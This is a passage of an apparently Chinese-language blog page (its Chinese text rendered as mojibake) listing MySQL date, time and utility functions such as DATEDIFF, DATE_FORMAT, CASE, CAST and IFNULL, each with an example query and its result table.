MINUTE(t)  |SECOND(t)</strong></p><p>ä»æ—¥æœŸæˆ–æ—¥æœŸæ—¶é—´è¡¨è¾¾å¼ä¸­æå–æ—¥æœŸå€¼|å°æ—¶å€¼|åˆ†é’Ÿå€¼|ç§’é’Ÿå€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE(&#39;2020-11-11 0:0:0&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| DATE(&#39;2020-11-11 0:0:0&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">| 2020-11-11               |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.DATEDIFF(d1,d2)</strong></p><p>è®¡ç®—æ—¥æœŸ d1-&gt;d2 ä¹‹é—´ç›¸éš”çš„å¤©æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DATEDIFF(&#39;2020-11-22&#39;,&#39;2021-6-7&#39;);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| DATEDIFF(&#39;2020-11-22&#39;,&#39;2021-6-7&#39;) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                              -197 |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>7.DATE_FORMAT(d,f)</strong></p><p> æŒ‰è¡¨è¾¾å¼ fçš„è¦æ±‚æ˜¾ç¤ºæ—¥æœŸ d</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;);</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;) |</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| 2011-11-11 11:11:11 AM                           |</span><br><span class="line">+--------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>8.DATE_SUB(date,INTERVAL expr type)</strong></p><p>å‡½æ•°ä»æ—¥æœŸå‡å»æŒ‡å®šçš„æ—¶é—´é—´éš”ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> select * from Orders;</span><br><span class="line">+---------+------------+</span><br><span class="line">| OrderId | OrderDate  |</span><br><span class="line">+---------+------------+</span><br><span class="line">|       1 | 2020-11-11 |</span><br><span class="line">+---------+------------+</span><br><span class="line">SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders;</span><br><span class="line">+---------+--------------+</span><br><span class="line">| OrderId | OrderPayDate |</span><br><span class="line">+---------+--------------+</span><br><span class="line">|       1 | 2020-11-09   |</span><br><span class="line">+---------+--------------+</span><br></pre></td></tr></table></figure><p><strong>9.DAY(d)</strong></p><p>è¿”å›æ—¥æœŸå€¼ d çš„æ—¥æœŸéƒ¨åˆ†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DAY(&#39;2020-11-11&#39;) AS day;</span><br><span class="line">+------+</span><br><span class="line">| day  |</span><br><span class="line">+------+</span><br><span class="line">|   11 |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p><strong>10.DAYNAME(d)</strong></p><p>è¿”å›æ—¥æœŸ d æ˜¯æ˜ŸæœŸå‡ ï¼Œå¦‚ Monday,Tuesday</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DAYNAME(&#39;2020-11-11&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| DAYNAME(&#39;2020-11-11&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| Wednesday             |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>11.DAYOFYEAR(d)</strong></p><p> è®¡ç®—æ—¥æœŸ d æ˜¯æœ¬å¹´çš„ç¬¬å‡ å¤©</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT DAYOFYEAR (&#39;2020-11-11&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| DAYOFYEAR (&#39;2020-11-11&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                      316 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.EXTRACT(type FROM d)</strong></p><p>ä»æ—¥æœŸ d ä¸­è·å–æŒ‡å®šçš„å€¼ï¼Œtype æŒ‡å®šè¿”å›çš„å€¼ã€‚<br>typeå¯å–å€¼ä¸ºï¼š</p><ul><li>MICROSECOND</li><li>SECOND</li><li>MINUTE</li><li>HOUR</li><li>DAY</li><li>WEEK</li><li>MONTH</li><li>QUARTER</li><li>YEAR</li><li>SECOND_MICROSECOND</li><li>MINUTE_MICROSECOND</li><li>MINUTE_SECOND</li><li>HOUR_MICROSECOND</li><li>HOUR_SECOND</li><li>HOUR_MINUTE</li><li>DAY_MICROSECOND</li><li>DAY_SECOND</li><li>DAY_MINUTE</li><li>DAY_HOUR</li><li>YEAR_MONTH</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT EXTRACT(MINUTE FROM &#39;2020-11-11 11:11:11&#39;);</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| EXTRACT(MINUTE FROM &#39;2020-11-11 11:11:11&#39;) |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">|                                         11 |</span><br><span class="line">+--------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.FROM_DAYS(n)</strong></p><p>è®¡ç®—ä» 0000 å¹´ 1 æœˆ 1 æ—¥å¼€å§‹ n å¤©åçš„æ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FROM_DAYS(9999);</span><br><span class="line">+-----------------+</span><br><span class="line">| FROM_DAYS(9999) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 0027-05-18      |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>14.TO_DAYS(d)</strong></p><p>è®¡ç®—æ—¥æœŸ d è·ç¦» 0000 å¹´ 1 æœˆ 1 æ—¥çš„å¤©æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TO_DAYS(&#39;0027-05-18&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| TO_DAYS(&#39;0027-05-18&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                  9999 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>15.LAST_DAY(d)</strong></p><p>è¿”å›ç»™å®šæ—¥æœŸçš„é‚£ä¸€æœˆä»½çš„æœ€åä¸€å¤©</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LAST_DAY(&#39;2020-2-1&#39;);</span><br><span class="line">+----------------------+</span><br><span class="line">| LAST_DAY(&#39;2020-2-1&#39;) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 2020-02-29           |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>16.MAKEDATE(year, day-of-year)</strong></p><p>åŸºäºç»™å®šå‚æ•°å¹´ä»½ year å’Œæ‰€åœ¨å¹´ä¸­çš„å¤©æ•°åºå· day-of-year è¿”å›ä¸€ä¸ªæ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MAKEDATE(2020,300);</span><br><span class="line">+--------------------+</span><br><span class="line">| MAKEDATE(2020,300) |</span><br><span class="line">+--------------------+</span><br><span class="line">| 2020-10-26         |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>17.MAKETIME(hour, minute, second)</strong></p><p>ç»„åˆæ—¶é—´ï¼Œå‚æ•°åˆ†åˆ«ä¸ºå°æ—¶ã€åˆ†é’Ÿã€ç§’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT MAKETIME(1,2,3);</span><br><span class="line">+-----------------+</span><br><span class="line">| MAKETIME(1,2,3) |</span><br><span class="line">+-----------------+</span><br><span class="line">| 01:02:03        |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>18.MONTHNAME(d)</strong></p><p>è¿”å›æ—¥æœŸå½“ä¸­çš„æœˆä»½åç§°ï¼Œå¦‚ November</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MONTHNAME(&#39;2020-11-11&#39;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| MONTHNAME(&#39;2020-11-11&#39;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| November                |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>19.PERIOD_ADD(period, number)</strong></p><p>ä¸º å¹´-æœˆ ç»„åˆæ—¥æœŸæ·»åŠ ä¸€ä¸ªæ—¶æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT PERIOD_ADD(202011,7);</span><br><span class="line">+----------------------+</span><br><span class="line">| PERIOD_ADD(202011,7) |</span><br><span class="line">+----------------------+</span><br><span class="line">|               202106 |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>20.PERIOD_DIFF(period1, period2)</strong></p><p>è¿”å›ä¸¤ä¸ªæ—¶æ®µä¹‹é—´çš„æœˆä»½å·®å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT PERIOD_DIFF(202011,202109);</span><br><span class="line">+----------------------------+</span><br><span class="line">| PERIOD_DIFF(202011,202109) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                        -10 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>21.TIMEDIFF(time1, time2)</strong></p><p>è®¡ç®—æ—¶é—´å·®å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TIMEDIFF(&#39;1:2:3&#39;,&#39;4:5:6&#39;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| TIMEDIFF(&#39;1:2:3&#39;,&#39;4:5:6&#39;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| -03:03:03                 |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure><p><strong>22.QUARTER(d)</strong></p><p>è¿”å›æ—¥æœŸdæ˜¯ç¬¬å‡ å­£èŠ‚ï¼Œè¿”å› 1 åˆ° 4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT QUARTER(&#39;2020-11-11&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| QUARTER(&#39;2020-11-11&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     4 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>23.SEC_TO_TIME(s)</strong></p><p>å°†ä»¥ç§’ä¸ºå•ä½çš„æ—¶é—´ s è½¬æ¢ä¸ºæ—¶åˆ†ç§’çš„æ ¼å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SEC_TO_TIME(9999);</span><br><span class="line">+-------------------+</span><br><span class="line">| SEC_TO_TIME(9999) |</span><br><span class="line">+-------------------+</span><br><span class="line">| 02:46:39          |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>24.TIME_TO_SEC(t)</strong></p><p>å°†æ—¶é—´ t è½¬æ¢ä¸ºç§’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TIME_TO_SEC(&#39;02:46:39&#39;);</span><br><span class="line">+-------------------------+</span><br><span class="line">| TIME_TO_SEC(&#39;02:46:39&#39;) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                    9999 |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><p><strong>25.STR_TO_DATE(string, format_mask)</strong></p><p>å°†å­—ç¬¦ä¸²è½¬å˜ä¸ºæ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT STR_TO_DATE(&#39;November 11 2020&#39;, &#39;%M %d %Y&#39;);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| STR_TO_DATE(&#39;November 11 2020&#39;, &#39;%M %d %Y&#39;) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| 2020-11-11                                  |</span><br><span class="line">+---------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>26.SUBDATE(d,n)</strong></p><p> æ—¥æœŸ d å‡å» n å¤©åçš„æ—¥æœŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SUBDATE(&#39;2020-11-11 11:11:11&#39;, 366);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| SUBDATE(&#39;2020-11-11 11:11:11&#39;, 366) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| 2019-11-11 11:11:11                 |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>27.SUBTIME(t,n)</strong></p><p>æ—¶é—´ t å‡å» n ç§’çš„æ—¶é—´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT SUBTIME(&#39;2020-11-11 11:11:11&#39;, 11);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| SUBTIME(&#39;2020-11-11 11:11:11&#39;, 11) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| 2020-11-11 11:11:00                |</span><br><span class="line">+------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>28.TIME(expression)</strong></p><p>æå–ä¼ å…¥è¡¨è¾¾å¼çš„æ—¶é—´éƒ¨åˆ†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT TIME(&#39;2020-11-11 19:30:00&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| TIME(&#39;2020-11-11 19:30:00&#39;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 19:30:00                    |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p><strong>29.TIME_FORMAT(t,f)</strong></p><p>æŒ‰è¡¨è¾¾å¼ f çš„è¦æ±‚æ˜¾ç¤ºæ—¶é—´ t</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 11:11:11 AM                  |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure><p><strong>30.WEEK(d)</strong></p><p>è®¡ç®—æ—¥æœŸ d æ˜¯æœ¬å¹´çš„ç¬¬å‡ ä¸ªæ˜ŸæœŸï¼ŒèŒƒå›´æ˜¯ 0 åˆ° 53</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT WEEK(&#39;2020-11-11 11:11:11&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| WEEK(&#39;2020-11-11 11:11:11&#39;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">|                          45 |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-é«˜çº§å‡½æ•°"><a href="#MySQL-é«˜çº§å‡½æ•°" class="headerlink" title="MySQL é«˜çº§å‡½æ•°"></a>MySQL é«˜çº§å‡½æ•°</h2><p><strong>1.BIN(x)  |  OCT(x)  |  HEX(x)</strong></p><p>è¿”å› x çš„äºŒè¿›åˆ¶ç¼–ç |å…«è¿›åˆ¶ç¼–ç |åå…­è¿›åˆ¶ç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT BIN(10);</span><br><span class="line">+---------+</span><br><span class="line">| BIN(10) |</span><br><span class="line">+---------+</span><br><span class="line">| 1010    |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>2.BINARY(s)</strong></p><p> å°†å­—ç¬¦ä¸² s è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT BINARY &#39;MySQL&#39;;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| BINARY &#39;MySQL&#39;                 |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| 0x4D7953514C                   |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><p><strong>3.æ¡ä»¶åˆ¤æ–­å‡½æ•°</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CASE expression</span><br><span class="line">    WHEN condition1 THEN result1</span><br><span class="line">    WHEN condition2 THEN result2</span><br><span class="line">   ...</span><br><span class="line">    WHEN conditionN THEN resultN</span><br><span class="line">    ELSE result</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>CASE è¡¨ç¤ºå‡½æ•°å¼€å§‹ï¼ŒEND è¡¨ç¤ºå‡½æ•°ç»“æŸã€‚å¦‚æœ condition1 æˆç«‹ï¼Œåˆ™è¿”å› result1, å¦‚æœ condition2 æˆç«‹ï¼Œåˆ™è¿”å› result2ï¼Œå½“å…¨éƒ¨ä¸æˆç«‹åˆ™è¿”å› resultï¼Œè€Œå½“æœ‰ä¸€ä¸ªæˆç«‹ä¹‹åï¼Œåé¢çš„å°±ä¸æ‰§è¡Œäº†ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SELECT CASE </span><br><span class="line">    -&gt; WHEN &#39;1 &gt; 0&#39; THEN &#39;1 &gt; 0&#39;</span><br><span class="line">    -&gt; WHEN &#39;2 &gt; 0&#39; THEN &#39;2 &gt; 0&#39;</span><br><span class="line">    -&gt; ELSE &#39;3 &gt; 0&#39;</span><br><span class="line">    -&gt; END;</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">| CASE </span><br><span class="line">WHEN &#39;1 &gt; 0&#39; THEN &#39;1 &gt; 0&#39;</span><br><span class="line">WHEN &#39;2 &gt; 0&#39; THEN &#39;2 &gt; 0&#39;</span><br><span class="line">ELSE &#39;3 &gt; 0&#39;</span><br><span class="line">END |</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">| 1 &gt; 0                                                                      |</span><br><span class="line">+----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>4.CAST(x AS type)</strong></p><p>è½¬æ¢æ•°æ®ç±»å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CAST(&quot;2020-11-11&quot; AS DATE);</span><br><span class="line">+----------------------------+</span><br><span class="line">| CAST(&quot;2020-11-11&quot; AS DATE) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| 2020-11-11                 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.COALESCE(expr1, expr2, â€¦., expr_n)</strong></p><p>è¿”å›å‚æ•°ä¸­çš„ç¬¬ä¸€ä¸ªéç©ºè¡¨è¾¾å¼ï¼ˆä»å·¦å‘å³ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT COALESCE(NULL,NULL,&#39;MySQL&#39;,NULL,&#39;Oracle&#39;,NULL);</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| COALESCE(NULL,NULL,&#39;MySQL&#39;,NULL,&#39;Oracle&#39;,NULL) |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| MySQL                                          |</span><br><span class="line">+------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.CONNECTION_ID()</strong></p><p>è¿”å›å”¯ä¸€çš„è¿æ¥ ID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONNECTION_ID();</span><br><span class="line">+-----------------+</span><br><span class="line">| CONNECTION_ID() |</span><br><span class="line">+-----------------+</span><br><span class="line">|              11 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>7.CONV(x,f1,f2)</strong></p><p> è¿”å› f1 è¿›åˆ¶æ•°å˜æˆ f2 è¿›åˆ¶æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CONV(10,10,2);</span><br><span class="line">+---------------+</span><br><span class="line">| CONV(10,10,2) |</span><br><span class="line">+---------------+</span><br><span class="line">| 1010          |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>8.CONVERT(s USING cs)</strong></p><p>å‡½æ•°å°†å­—ç¬¦ä¸² s çš„å­—ç¬¦é›†å˜æˆ cs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT CHARSET(&#39;ABC&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| CHARSET(&#39;ABC&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| utf8mb4        |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT CHARSET(CONVERT(&#39;ABC&#39; USING gbk));</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| CHARSET(CONVERT(&#39;ABC&#39; USING gbk)) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| gbk                               |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>9.USER()  |CURRENT_USER()  |SESSION_USER()  |SYSTEM_USER()</strong></p><p>è¿”å›å½“å‰ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CURRENT_USER();</span><br><span class="line">+----------------+</span><br><span class="line">| CURRENT_USER() |</span><br><span class="line">+----------------+</span><br><span class="line">| root@%         |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>10.DATABASE()</strong></p><p>è¿”å›å½“å‰æ•°æ®åº“å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATABASE();</span><br><span class="line">+------------+</span><br><span class="line">| DATABASE() |</span><br><span class="line">+------------+</span><br><span class="line">| mysql      |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>11.IF(expr,v1,v2)</strong></p><p>å¦‚æœè¡¨è¾¾å¼ expr æˆç«‹ï¼Œè¿”å›ç»“æœ v1ï¼›å¦åˆ™ï¼Œè¿”å›ç»“æœ v2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF(1 &gt; 0,&#39;æ­£ç¡®&#39;,&#39;é”™è¯¯&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| IF(1 &gt; 0,&#39;æ­£ç¡®&#39;,&#39;é”™è¯¯&#39;)     |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| æ­£ç¡®                        |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.IFNULL(v1,v2)</strong></p><p>å¦‚æœ v1 çš„å€¼ä¸ä¸º NULLï¼Œåˆ™è¿”å› v1ï¼Œå¦åˆ™è¿”å› v2ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT IFNULL(null,&#39;Hello Word&#39;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| IFNULL(null,&#39;Hello Word&#39;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| Hello Word                |</span><br><span 